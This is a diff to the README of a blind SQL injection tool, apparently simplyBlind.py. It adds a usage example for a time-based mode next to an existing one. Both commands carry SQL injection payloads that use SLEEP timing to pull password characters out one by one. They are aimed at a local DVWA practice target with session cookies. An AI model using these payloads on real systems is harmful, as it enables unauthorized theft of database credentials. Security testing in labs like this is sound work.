@@ -37,6 +37,9 @@ python simplyBlind.py quick -m reg --regex "User ID exists in the database" -p "
 
 ### Timeout:
 ```shell
+python simplyBlind.py quick -m nto --timeout 0.5 -p "1' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', False, SLEEP(0.7)) #" -c '{"PHPSESSID":"pojosba3ilii64mlql4cq06ma5", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
+```
+```shell
 python simplyBlind.py quick -m to --timeout 0.5 -p "10' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', SLEEP(0.7), FALSE) #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
 ```
 ![timeout](img/time.gif)
